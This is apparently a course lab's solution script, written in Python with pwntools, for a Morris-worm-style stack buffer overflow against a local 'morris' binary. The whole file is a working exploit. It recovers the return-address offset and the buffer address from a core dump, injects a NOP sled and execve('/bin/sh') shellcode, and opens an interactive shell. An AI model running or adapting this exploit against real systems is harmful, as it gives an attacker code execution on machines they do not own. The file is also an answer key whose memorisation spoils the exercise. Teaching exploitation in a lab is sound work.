#!/usr/bin/env python3
"""Solution for morris: 1988 Morris-Worm-style finger overflow (return-to-stack).

There is NO address leak here -- finding the buffer address is the real
challenge from the lecture (slides 27-30, "Exploit w/ or w/o GDB",
"Why Different?"). ASLR is off on the VM, so with a FIXED environment the
stack address is deterministic. We:
  1) crash with a cyclic pattern and read the core dump,
  2) recover the offset with cyclic_find(core.eip),
  3) locate buf by searching the core for our pattern,
  4) exploit a fresh run (same env) with a NOP sled + shellcode.

Run:  cd example3 && make && python3 solution3/solve_morris.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "morris")

# Fix (empty) the environment so the crash run and the exploit run share the
# same stack layout -- this is what makes buf's address predictable.
ENV = {}


def recon():
    """Crash with a cyclic pattern; from the core dump get the offset and buf."""
    io = process(BIN, env=ENV)
    io.sendline(cyclic(2000))
    io.wait()
    core = io.corefile
    offset = cyclic_find(core.eip)          # which 4 bytes of the pattern hit eip
    buf_addr = next(core.search(cyclic(8)))  # first pattern bytes live at buf start
    io.close()
    log.success("offset(buf -> return address) = %d", offset)
    log.success("buf @ %#x", buf_addr)
    return offset, buf_addr


def main():
    offset, buf_addr = recon()

    shellcode = asm(shellcraft.sh())         # execve("/bin/sh", 0, 0)
    # NOP sled fills the buffer; shellcode sits at the end, just before the
    # return address. Returning to buf lands in the sled and slides down.
    payload = b"\x90" * (offset - len(shellcode)) + shellcode
    assert len(payload) == offset, "shellcode larger than the buffer"
    payload += p32(buf_addr)                  # return into the NOP sled

    io = process(BIN, env=ENV)
    io.sendline(payload)
    log.success("shellcode injected -- checking for a shell")
    io.sendline(b"id; uname -a; echo MORRIS_PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
